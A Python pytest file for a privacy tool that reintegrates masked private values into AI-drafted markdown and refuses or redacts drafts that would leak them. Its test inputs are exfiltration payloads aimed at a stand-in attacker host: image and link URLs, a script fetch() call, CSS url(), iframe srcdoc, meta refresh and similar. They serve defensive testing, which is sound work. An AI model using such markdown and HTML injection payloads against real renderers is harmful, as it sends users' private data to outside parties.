"""Fix 2. The attack from the audit is the first test, and the renderer is the oracle.

`test_rendered_html_carries_no_private_value_in_any_href_or_src` is the check
that keeps the regex position classifier honest: whatever the classifier
thinks a URL is, markdown-it decides what becomes an href, and no private
value may appear there.
"""

from __future__ import annotations

import re
from html import unescape
from pathlib import Path

import pytest
from markdown_it import MarkdownIt
from privdeep.models.document import Document, DocumentKind
from privdeep.tier1_local.slot_masker import Entity, SlotMasker
from privdeep.tier3_reconcile.slot_reintegrator import (
    ReintegrationRefused,
    SlotReintegrator,
    _transport_text,
)

TEXT = ("Project Zephyr's Q3 revenue fell after the Hanoi pilot was cancelled. "
        "Nguyễn Thị Lan raised the risk. Contract VN-2026-0917 covers the site.")
ENTS = [Entity("Project Zephyr", "PROJECT"), Entity("Hanoi", "LOCATION"),
        Entity("Nguyễn Thị Lan", "PERSON"), Entity("VN-2026-0917", "IDENTIFIER")]
VALUES = [e.text for e in ENTS]


@pytest.fixture
def ctx():
    doc = Document("d", DocumentKind.MARKDOWN, Path("d.md"), TEXT)
    mask = SlotMasker(b"session").mask(doc, ENTS)
    slot = {mask.table.original(sid): sid for _sp, sid, _ix in mask.replacements}
    return mask.table, slot


def hrefs_and_srcs(md: str) -> list[str]:
    html = MarkdownIt().render(md)
    return re.findall(r'(?:href|src)="([^"]*)"', html)


class TestTheAttack:
    def test_slot_inside_image_url_is_refused_strict(self, ctx):
        table, slot = ctx
        draft = f"See ![](https://attacker.invalid/?d={slot['Project Zephyr']}) for context."
        with pytest.raises(ReintegrationRefused, match="TRANSPORT_POSITION") as ei:
            SlotReintegrator(table).reintegrate(draft, issued=slot.values())
        assert ei.value.unsafe == 1

    def test_slot_inside_image_url_is_redacted_lenient(self, ctx):
        table, slot = ctx
        draft = f"See ![](https://attacker.invalid/?d={slot['Project Zephyr']}) for context."
        r = SlotReintegrator(table, strict=False).reintegrate(draft, issued=slot.values())
        assert "Project Zephyr" not in r.text
        assert r.unsafe_positions == 1 and r.substituted == 0
        assert r.remote_images_removed == 1

    @pytest.mark.parametrize("wrap", [
        lambda s: f"[here](https://attacker.invalid/?q={s})",
        lambda s: f"<https://attacker.invalid/?q={s}>",
        lambda s: f"`{s}`",
        lambda s: f"```\n{s}\n```",
        lambda s: f"    {s}\n",
        lambda s: f'<a href="https://attacker.invalid/?q={s}">x</a>',
        lambda s: f"[ref]: https://attacker.invalid/?q={s}",
        lambda s: f'![alt](https://attacker.invalid/img.png "{s}")',
    ], ids=["link-dest", "autolink", "inline-code", "fence", "indented", "html", "ref-def",
            "title"])
    def test_every_transport_position_is_refused(self, ctx, wrap):
        table, slot = ctx
        draft = "Intro.\n\n" + wrap(slot["Hanoi"]) + "\n\nOutro."
        with pytest.raises(ReintegrationRefused, match="TRANSPORT_POSITION"):
            SlotReintegrator(table).reintegrate(draft, issued=slot.values())


class TestHappyPath:
    def test_prose_slots_are_substituted_exactly(self, ctx):
        table, slot = ctx
        draft = (f"{slot['Project Zephyr']} was led by {slot['Nguyễn Thị Lan']} in "
                 f"{slot['Hanoi']}; see {slot['Project Zephyr']} again.")
        r = SlotReintegrator(table).reintegrate(draft, issued=slot.values())
        assert r.text == ("Project Zephyr was led by Nguyễn Thị Lan in Hanoi; "
                          "see Project Zephyr again.")
        assert r.substituted == 4 and set(r.unique_slots) == {
            slot["Project Zephyr"], slot["Nguyễn Thị Lan"], slot["Hanoi"]}
        assert r.missing_issued == (slot["VN-2026-0917"],)
        assert r.unsafe_positions == 0

    def test_slot_in_link_text_is_fine_but_not_in_destination(self, ctx):
        table, slot = ctx
        draft = f"[{slot['Hanoi']} office](https://example.invalid/office) opened."
        r = SlotReintegrator(table).reintegrate(draft, issued=slot.values())
        assert r.text.startswith("[Hanoi office](https://example.invalid/office)")
        assert hrefs_and_srcs(r.text) == ["https://example.invalid/office"]

    def test_markdown_structure_survives(self, ctx):
        table, slot = ctx
        draft = (f"# Findings\n\n- {slot['Project Zephyr']} declined\n- {slot['Hanoi']} pilot\n\n"
                 f"> {slot['Nguyễn Thị Lan']} raised the risk.\n")
        r = SlotReintegrator(table).reintegrate(draft, issued=slot.values())
        html = MarkdownIt().render(r.text)
        assert "<h1>Findings</h1>" in html and "<li>Project Zephyr declined</li>" in html
        assert "<blockquote>" in html and "Nguyễn Thị Lan" in html

    def test_remote_images_removed_local_kept(self, ctx):
        table, slot = ctx
        draft = ("![chart](https://cdn.example.invalid/c.png) and ![local](figs/c.png) "
                 f"about {slot['Hanoi']}.")
        r = SlotReintegrator(table).reintegrate(draft, issued=slot.values())
        assert "[image removed: chart]" in r.text and "![local](figs/c.png)" in r.text
        assert r.remote_images_removed == 1

    def test_no_issued_list_means_any_table_slot_is_allowed(self, ctx):
        table, slot = ctx
        r = SlotReintegrator(table).reintegrate(f"{slot['Hanoi']}.")
        assert r.text == "Hanoi." and r.missing_issued == ()


class TestInvented:
    def test_unknown_slot_is_refused(self, ctx):
        table, slot = ctx
        with pytest.raises(ReintegrationRefused, match="INVENTED_SLOT") as ei:
            SlotReintegrator(table).reintegrate("x ⟦SLOT:ORG_deadbeef⟧ y", issued=slot.values())
        assert ei.value.invented == ("⟦SLOT:ORG_deadbeef⟧",)

    def test_known_but_not_issued_for_this_section_is_refused(self, ctx):
        table, slot = ctx
        with pytest.raises(ReintegrationRefused, match="INVENTED_SLOT"):
            SlotReintegrator(table).reintegrate(f"{slot['Hanoi']}", issued=[slot["Project Zephyr"]])


class TestRendererIsTheOracle:
    @pytest.mark.parametrize("draft_tpl", [
        "Plain {P} and {H} in prose.",
        "[{P}](https://example.invalid/x) and ![{H}](figs/a.png)",
        "See <https://example.invalid/?u=1> then {P}.",
        "`code` then {H} then `more code`",
        "A [link][r] to {P}.\n\n[r]: https://example.invalid/r",
    ])
    def test_rendered_html_carries_no_private_value_in_any_href_or_src(self, ctx, draft_tpl):
        table, slot = ctx
        draft = draft_tpl.format(P=slot["Project Zephyr"], H=slot["Hanoi"])
        r = SlotReintegrator(table).reintegrate(draft, issued=slot.values())
        for url in hrefs_and_srcs(r.text):
            for v in VALUES:
                assert v not in url, f"private value in URL attribute: {url!r}"


class TestConstructsTheSourceRegexDoesNotModel:
    """Five CommonMark constructs that put a private value into rendered markup.

    Each was found by reading the grammar for shapes `_UNSAFE_PATTERNS` does not
    match, and each was reproduced against the shipped classifier: the value was
    substituted and rendered into an `href`, a `src`, or a `<script>` body. They
    are the argument for checking the rendered output instead of the source: a
    regex approximation of CommonMark diverges from it, and every divergence is
    a value in a URL.

    `test_rendered_html_carries_no_private_value_in_any_href_or_src` above kept
    the classifier honest for the shapes it happened to cover. These are the
    shapes it did not.
    """

    @pytest.mark.parametrize("draft_tpl, label", [
        ("[a](https://attacker.invalid/(x)y?d={H})", "balanced parens in destination"),
        ('<img alt="a > b" src="https://attacker.invalid/?d={H}">', "'>' in a quoted attribute"),
        ("A [link][r] here.\n\n[r]:\n  https://attacker.invalid/?d={H}", "multi-line ref def"),
        ("<script>\nfetch('https://attacker.invalid/?d='+'{H}')\n</script>", "script body"),
        ("<style>body{{background:url('https://attacker.invalid/?d={H}')}}</style>",
         "style url()"),
    ])
    def test_strict_refuses(self, ctx, draft_tpl, label):
        table, slot = ctx
        draft = draft_tpl.format(H=slot["Hanoi"])
        with pytest.raises(ReintegrationRefused, match="TRANSPORT_POSITION"):
            SlotReintegrator(table).reintegrate(draft, issued=slot.values())

    @pytest.mark.parametrize("draft_tpl, label", [
        ("[a](https://attacker.invalid/(x)y?d={H})", "balanced parens in destination"),
        ('<img alt="a > b" src="https://attacker.invalid/?d={H}">', "'>' in a quoted attribute"),
        ("A [link][r] here.\n\n[r]:\n  https://attacker.invalid/?d={H}", "multi-line ref def"),
        ("<script>\nfetch('https://attacker.invalid/?d='+'{H}')\n</script>", "script body"),
        ("<style>body{{background:url('https://attacker.invalid/?d={H}')}}</style>",
         "style url()"),
    ])
    def test_lenient_redacts_and_the_value_never_renders(self, ctx, draft_tpl, label):
        table, slot = ctx
        draft = draft_tpl.format(H=slot["Hanoi"])
        r = SlotReintegrator(table, strict=False).reintegrate(draft, issued=slot.values())
        assert r.unsafe_positions >= 1, label
        assert "Hanoi" not in _transport_text(r.text), label

    def test_the_script_body_case_is_invisible_to_an_href_only_oracle(self, ctx):
        """Why the check reads script and style bodies, not just attributes.

        This payload exfiltrates with no user interaction, and a test that only
        inspects `href` and `src` cannot see it. That is exactly the oracle the
        suite used before, so the gap was structural rather than an oversight.
        """
        table, slot = ctx
        draft = f"<script>fetch('https://attacker.invalid/?d='+'{slot['Hanoi']}')</script>"
        r = SlotReintegrator(table, strict=False).reintegrate(draft, issued=slot.values())
        assert hrefs_and_srcs(r.text) == []
        assert "Hanoi" not in r.text


class TestValuesTheReaderMaySee:
    """`alt` and `title` are not transport, and prose is not transport.

    The threat is a request leaving the viewer, not text the reader can already
    see: the reader is handed real values by design. Over-refusing here would
    blank sections for a formatting habit, and THREAT_MODEL.md lists the refusal
    indicator as a corpus-dependent observable, so a false refusal is itself a
    small leak.
    """

    @pytest.mark.parametrize("draft_tpl", [
        "The pilot in {H} was cancelled during the third quarter of the year.",
        "[{H}](https://example.invalid/city) is the site of the pilot.",
        "![figure]( figs/local.png ) and then {H} in the caption below.",
        "> A quoted line mentioning {H}.",
        "| site | {H} |\n|---|---|",
    ])
    def test_safe_positions_still_substitute(self, ctx, draft_tpl):
        table, slot = ctx
        draft = draft_tpl.format(H=slot["Hanoi"])
        r = SlotReintegrator(table).reintegrate(draft, issued=slot.values())
        assert "Hanoi" in r.text and r.substituted == 1

    def test_a_link_title_is_not_treated_as_transport(self, ctx):
        table, slot = ctx
        draft = f"[a](https://example.invalid/u (note {slot['Hanoi']}))"
        r = SlotReintegrator(table).reintegrate(draft, issued=slot.values())
        assert "Hanoi" in r.text
        assert "Hanoi" not in "".join(hrefs_and_srcs(r.text))


NONASCII = "Nguyễn Thị Lan"
AMPERSAND = "A&B<C>"


@pytest.fixture
def ctx2():
    """A fixture whose values exercise the two re-encodings the renderer applies:
    a non-ASCII value (percent-encoded in destinations) and one containing
    `& < >` (entity-escaped in raw-text bodies). The original fixture's values
    are all plain ASCII, which is why a substring comparison looked correct."""
    text = "Nguyễn Thị Lan led it. The A&B<C> team helped. Hanoi hosted."
    ents = [Entity(NONASCII, "PERSON"), Entity(AMPERSAND, "ORG"), Entity("Hanoi", "LOCATION")]
    doc = Document("d2", DocumentKind.MARKDOWN, Path("d2.md"), text)
    mask = SlotMasker(b"session2").mask(doc, ents)
    return mask.table, {mask.table.original(sid): sid
                        for _sp, sid, _ix in mask.replacements}


class TestTheRendererReEncodes:
    """Substring-matching the value against rendered HTML is not sound.

    markdown-it percent-encodes link destinations and escapes `& < >` in inline
    raw text, so a value can be present in the fetch and absent from a raw
    comparison. For a Vietnamese corpus that is not an edge case, it is most of
    the corpus. Verification is by sentinel instead: an inert alphanumeric token
    stands in for the value during the position check, so the question asked is
    "did the span I substituted land here", which no re-encoding can hide.
    """

    def test_a_non_ascii_value_percent_encoded_into_an_href_is_refused(self, ctx2):
        table, slot = ctx2
        draft = f"[a](https://attacker.invalid/(x)y?d={slot[NONASCII]})"
        with pytest.raises(ReintegrationRefused, match="TRANSPORT_POSITION"):
            SlotReintegrator(table).reintegrate(draft, issued=slot.values())

    def test_a_value_with_entities_in_a_script_body_is_refused(self, ctx2):
        table, slot = ctx2
        draft = f"<script>fetch('https://attacker.invalid/?d='+'{slot[AMPERSAND]}')</script>"
        with pytest.raises(ReintegrationRefused, match="TRANSPORT_POSITION"):
            SlotReintegrator(table).reintegrate(draft, issued=slot.values())


class TestAttributesNobodyEnumerated:
    """The fetching-attribute allowlist was incomplete, so the polarity is now
    inverted: every attribute is transport unless it is on a short safe list.
    `srcdoc` is the case that makes the argument — it carries a whole document,
    not a URL, and it was absent."""

    @pytest.mark.parametrize("draft_tpl, label", [
        ('<iframe srcdoc="<img src=https://a.invalid/?d={H}>"></iframe>', "srcdoc"),
        ('<svg><use xlink:href="https://a.invalid/?d={H}"/></svg>', "xlink:href"),
        ('<link rel=preload imagesrcset="https://a.invalid/?d={H} 1x">', "imagesrcset"),
        ('<meta http-equiv="refresh" content="0;url=https://a.invalid/?d={H}">', "meta refresh"),
        ('<object data="https://a.invalid/?d={H}"></object>', "object data"),
        ('<video poster="https://a.invalid/?d={H}"></video>', "poster"),
    ])
    def test_refused(self, ctx, draft_tpl, label):
        table, slot = ctx
        draft = draft_tpl.format(H=slot["Hanoi"])
        with pytest.raises(ReintegrationRefused, match="TRANSPORT_POSITION"):
            SlotReintegrator(table).reintegrate(draft, issued=slot.values())


class TestNoFalseRefusals:
    """The counterpart obligation. A refusal blanks a section, and
    THREAT_MODEL.md lists the refusal indicator as a corpus-dependent
    observable, so refusing what is safe is itself a small leak."""

    def test_a_legitimate_url_containing_the_value_does_not_refuse(self, ctx):
        """The cloud may cite a real URL that happens to contain the value.
        Reintegration did not put it there, and a substring test could not tell
        the difference — it refused the whole section."""
        table, slot = ctx
        draft = f"See [docs](https://example.invalid/Hanoi/guide) about {slot['Hanoi']}."
        r = SlotReintegrator(table).reintegrate(draft, issued=slot.values())
        assert r.substituted == 1 and "about Hanoi." in r.text

    def test_a_value_with_markdown_metacharacters_cannot_restructure_the_document(self, ctx2):
        """`A&B<C>` spliced raw would open a tag; a value containing `](` would
        close the link it sits in and make the rest of the line a destination."""
        table, slot = ctx2
        draft = f"[link](https://ok.invalid/) and {slot[AMPERSAND]} here"
        r = SlotReintegrator(table).reintegrate(draft, issued=slot.values())
        assert AMPERSAND not in _transport_text(r.text)
        # The reader still sees the true value: markdown-it entity-escapes it
        # for display, which is presentation rather than alteration.
        assert AMPERSAND in unescape(MarkdownIt().render(r.text))
        assert hrefs_and_srcs(r.text) == ["https://ok.invalid/"]


class TestEscapingDoesNotDisfigureValues:
    """Found by the first live measurement, not by review.

    The reintegrator escaped . and - along with the characters that can
    actually open a link or tag, so "187,432.55" reached the report as
    "187,432\\.55". The judge reads raw Markdown; the private report carried
    42 escapes and the oracle's none. A presentation artefact in one arm only,
    in front of a judge scoring coherence and specificity.
    """

    @pytest.mark.parametrize("value", ["187,432.55", "2026-06-01", "NB-2026-0917", "Wow!"])
    def test_ordinary_values_are_spliced_verbatim(self, value):
        doc = Document("e", DocumentKind.MARKDOWN, Path("e.md"), f"The figure {value} stands.")
        mask = SlotMasker(b"esc").mask(doc, [Entity(value, "MONEY")])
        sid = mask.replacements[0][1]
        r = SlotReintegrator(mask.table).reintegrate(f"The figure was {sid} in total.",
                                                     issued=[sid])
        assert value in r.text and "\\" not in r.text

    @pytest.mark.parametrize("value", ["A&B<C>", "Acme](x)", "x`y", "[bracket]"])
    def test_characters_that_open_structure_are_still_escaped(self, value):
        doc = Document("e", DocumentKind.MARKDOWN, Path("e.md"), f"Name {value} here.")
        mask = SlotMasker(b"esc").mask(doc, [Entity(value, "ORG")])
        sid = mask.replacements[0][1]
        r = SlotReintegrator(mask.table).reintegrate(f"[link](https://ok.invalid/) and {sid}.",
                                                     issued=[sid])
        assert hrefs_and_srcs(r.text) == ["https://ok.invalid/"]
        assert value in unescape(MarkdownIt().render(r.text))


class TestWhatTheSentinelCannotModel:
    """The position checks run on a sentinel, which starts with a letter and
    has no label anyone knows. Two ways the real fill differs (INS5 review)."""

    def test_a_backslash_before_the_placeholder_does_not_unescape_the_value(self):
        """"\\" + "\\[Acme\\]" is "\\\\[Acme\\]": an escaped backslash and a live
        bracket, which opened a link whose destination held the second value.
        With the sentinel the backslash was literal and nothing was a link."""
        text = "The [Acme] team met in Hanoi."
        ents = [Entity("[Acme]", "ORG"), Entity("Hanoi", "LOCATION")]
        mask = SlotMasker(b"bs").mask(Document("b", DocumentKind.MARKDOWN, Path("b.md"), text),
                                      ents)
        slot = {mask.table.original(sid): sid for _sp, sid, _ix in mask.replacements}
        draft = f"x \\{slot['[Acme]']} y](https://x.invalid/(a)?d={slot['Hanoi']})"
        r = SlotReintegrator(mask.table).reintegrate(draft, issued=slot.values())
        assert hrefs_and_srcs(r.text) == []
        assert "\\[Acme]" in unescape(MarkdownIt().render(r.text))

    @pytest.mark.parametrize("guess", ["hanoi", "danang"], ids=["right", "wrong"])
    def test_a_reference_image_labelled_by_a_value_does_not_fetch(self, ctx, guess):
        """The label is matched as text, and the value is the text, so a right
        guess in the definition fetched and a wrong one did not."""
        table, slot = ctx
        draft = f"About ![{slot['Hanoi']}] here.\n\n[{guess}]: https://attacker.invalid/{guess}"
        r = SlotReintegrator(table).reintegrate(draft, issued=slot.values())
        assert hrefs_and_srcs(r.text) == [] and "Hanoi" in r.text

    def test_any_remote_reference_image_disables_images(self, ctx):
        """Decided from the render, so it takes local images with it; stated in
        the module docstring as the price of not parsing labels by regex. The
        "[r]" left behind is a link to the draft's own URL, which is kept, as
        links are."""
        table, slot = ctx
        draft = (f"![x][r] and ![local](figs/c.png) about {slot['Hanoi']}.\n\n"
                 "[r]: https://cdn.example.invalid/c.png")
        r = SlotReintegrator(table).reintegrate(draft, issued=slot.values())
        assert "<img" not in MarkdownIt().render(r.text) and r.remote_images_removed == 1
